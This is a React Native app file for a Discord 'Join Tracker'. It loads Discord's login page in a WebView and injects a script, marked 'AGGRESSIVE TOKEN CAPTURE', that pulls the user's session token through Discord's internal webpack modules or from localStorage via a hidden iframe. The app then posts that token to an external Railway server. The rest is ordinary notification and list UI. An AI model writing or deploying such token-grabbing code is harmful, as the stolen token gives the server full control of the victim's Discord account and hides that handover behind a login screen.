import React, { useEffect, useRef, useState } from "react";
import {
  View,
  Text,
  FlatList,
  StyleSheet,
  TouchableOpacity,
  Alert,
  Platform,
  SafeAreaView,
  ActivityIndicator,
} from "react-native";
import { WebView } from "react-native-webview";
import * as Notifications from "expo-notifications";

Notifications.setNotificationHandler({
  handleNotification: async () => ({
    shouldShowAlert: true,
    shouldPlaySound: true,
    shouldSetBadge: false,
  }),
});

export default function App() {
  const [moves, setMoves] = useState([]);
  const [refreshing, setRefreshing] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showWebView, setShowWebView] = useState(false);
  const [myUserId, setMyUserId] = useState(null);

  const webViewRef = useRef(null);
  const lastSeenId = useRef(null);

  const API_URL = "https://intelligent-gratitude-production.up.railway.app";

  // AGGRESSIVE TOKEN CAPTURE SCRIPT
  const INJECTED_JAVASCRIPT = `
  (function() {
    function capture() {
      try {
        // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
        const webpack = window.webpackChunkdiscord_app;
        if (webpack) {
          const m = webpack.push([[Symbol()], {}, (e) => e]);
          for (const i in m.c) {
            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
              const token = m.c[i].exports.default.getToken();
              if (token && token.length > 20) {
                window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
                return true;
              }
            }
          }
        }

        // 2. TRY THE "IFRAME RESTORATION" HOOK
        // Discord deletes localStorage, but a new iframe can bring it back
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        const storage = iframe.contentWindow.localStorage;
        const token = storage.getItem('token');
        if (token) {
          const clean = token.replace(/"/g, '');
          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
          return true;
        }
      } catch (e) {}
      return false;
    }

    // Check every 500ms
    const timer = setInterval(() => {
      if (capture()) clearInterval(timer);
    }, 500);
  })();
`;

  useEffect(() => {
    registerForNotifications();
  }, []);

  useEffect(() => {
    if (isLoggedIn && myUserId) {
      fetchMoves();
      const interval = setInterval(fetchMoves, 5000);
      return () => clearInterval(interval);
    }
  }, [isLoggedIn, myUserId]);

  const onWebViewMessage = async (event) => {
    try {
      const message = JSON.parse(event.nativeEvent.data);
      if (message.type === "TOKEN" && message.data) {
        setShowWebView(false); // SUCCESS: Redirecting back to app
        await sendTokenToBackend(message.data);
      }
    } catch (e) {
      // Direct string fallback
      if (event.nativeEvent.data.length > 20) {
        setShowWebView(false);
        await sendTokenToBackend(event.nativeEvent.data);
      }
    }
  };

  const sendTokenToBackend = async (token) => {
    try {
      const response = await fetch(`${API_URL}/link-account`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token: token }),
      });
      const result = await response.json();
      if (response.ok) {
        setMyUserId(result.user_id);
        setIsLoggedIn(true);
        Alert.alert("✅ Connected", "Join tracking is now active!");
      }
    } catch (error) {
      Alert.alert("Server Error", "Could not reach your Railway backend.");
    }
  };

  const fetchMoves = async () => {
    if (!myUserId) return;
    try {
      const res = await fetch(`${API_URL}/get-moves/${myUserId}`);
      const data = await res.json();
      if (Array.isArray(data)) {
        if (
          lastSeenId.current &&
          data.length > 0 &&
          data[0].id !== lastSeenId.current
        ) {
          triggerNotification(data[0]);
        }
        if (data.length > 0) lastSeenId.current = data[0].id;
        setMoves(data);
      }
    } catch (err) {
      console.log("Polling for joins...");
    } finally {
      setRefreshing(false);
    }
  };

  const triggerNotification = async (move) => {
    await Notifications.scheduleNotificationAsync({
      content: { title: `📥 New Member!`, body: move.action },
      trigger: null,
    });
  };

  const registerForNotifications = async () => {
    if (Platform.OS === "web") return;
    const { status } = await Notifications.requestPermissionsAsync();
    if (status !== "granted") console.log("Notification permission denied");
  };

  // --- NEW: URL DETECTION BACKUP ---
  const handleNavigationChange = (navState) => {
    // If the browser reaches the chat/channels area, it means login is 100% done
    if (navState.url.includes("/channels/")) {
      webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT);
    }
  };
  /* ---------------- UPDATED UI RENDER ---------------- */
  const renderMove = ({ item }) => {
    // Detect which format we are looking at
    const isFormatA = item.expert === "NEW MEMBER";
    const displayName = isFormatA ? item.action.split(' ')[1] : item.expert;
    const displayAction = isFormatA ? "Joined the server" : item.action;

    return (
      <View style={styles.moveItem}>
        <View style={styles.headerRow}>
          <Text style={styles.expert}>👤 {displayName}</Text>
          <Text style={styles.serverTag}>{item.server}</Text>
        </View>
        <Text style={styles.actionText}>{displayAction}</Text>
        <Text style={styles.timeText}>
          {new Date(item.timestamp).toLocaleTimeString()}
        </Text>
      </View>
    );
  };

  if (showWebView) {
    return (
      <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
        <View style={styles.webViewHeader}>
          <TouchableOpacity onPress={() => setShowWebView(false)}>
            <Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text>
          </TouchableOpacity>
          <Text style={{ fontWeight: "bold" }}>Connect to Discord</Text>
          <View style={{ width: 50 }} />
        </View>

        <WebView
          ref={webViewRef}
          source={{ uri: "https://discord.com/login" }}
          injectedJavaScript={INJECTED_JAVASCRIPT}
          onMessage={onWebViewMessage}
          onNavigationStateChange={handleNavigationChange} // WATCH THE URL
          javaScriptEnabled={true}
          domStorageEnabled={true}
          style={{ flex: 1 }}
          // Using a Desktop UserAgent makes token storage easier to read
          userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
        />

        <View style={styles.statusFooter}>
          <ActivityIndicator size="small" color="#5865F2" />
          <Text style={styles.statusText}>
            {" "}
            Capturing Token Automatically...
          </Text>
        </View>
      </SafeAreaView>
    );
  }

  return (
    <View style={styles.container}>
      {!isLoggedIn ? (
        <View style={styles.loginContainer}>
          <Text style={styles.loginEmoji}>🚀</Text>
          <Text style={styles.title}>Join Tracker</Text>
          <Text style={styles.subtitle}>Automatically track new members.</Text>
          <TouchableOpacity
            style={styles.loginButton}
            onPress={() => setShowWebView(true)}
          >
            <Text style={styles.buttonText}>Connect Discord Account</Text>
          </TouchableOpacity>
        </View>
      ) : (
        <>
          <View style={styles.headerBar}>
            <Text style={styles.title}>Live Feed</Text>
            <TouchableOpacity onPress={() => setIsLoggedIn(false)}>
              <Text style={{ color: "#5865F2", fontWeight: "bold" }}>
                Reset
              </Text>
            </TouchableOpacity>
          </View>
          <FlatList
            data={moves}
            keyExtractor={(item) => item.id}
            renderItem={renderMove}
            refreshing={refreshing}
            onRefresh={() => {
              setRefreshing(true);
              fetchMoves();
            }}
            ListEmptyComponent={
              <Text style={styles.empty}>Waiting for activity...</Text>
            }
          />
        </>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, padding: 20, backgroundColor: "#f9f9f9" },
  webViewHeader: {
    height: 60,
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingHorizontal: 20,
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
  },
  loginContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    padding: 30,
  },
  loginEmoji: { fontSize: 80, marginBottom: 10 },
  headerBar: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    marginTop: 40,
    marginBottom: 20,
  },
  title: { fontSize: 26, fontWeight: "bold" },
  subtitle: {
    fontSize: 16,
    color: "#666",
    textAlign: "center",
    marginBottom: 30,
  },
  loginButton: {
    backgroundColor: "#5865F2",
    padding: 18,
    borderRadius: 15,
    width: "100%",
  },
  buttonText: {
    color: "#fff",
    textAlign: "center",
    fontWeight: "bold",
    fontSize: 16,
  },
  moveItem: {
    backgroundColor: "#fff",
    padding: 15,
    marginBottom: 10,
    borderRadius: 12,
    shadowOpacity: 0.1,
    shadowRadius: 5,
    elevation: 2,
  },
  headerRow: { flexDirection: "row", justifyContent: "space-between" },
  expert: { fontWeight: "bold", color: "#5865F2" },
  serverTag: {
    fontSize: 10,
    color: "#777",
    backgroundColor: "#eee",
    paddingHorizontal: 6,
    paddingVertical: 2,
    borderRadius: 10,
  },
  actionText: { marginTop: 8, fontSize: 15, color: "#333" },
  empty: { textAlign: "center", marginTop: 50, color: "#999" },
  statusFooter: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    padding: 20,
    backgroundColor: "#fff",
  },
  statusText: {
    fontSize: 13,
    color: "#5865F2",
    marginLeft: 10,
    fontWeight: "500",
  },
});
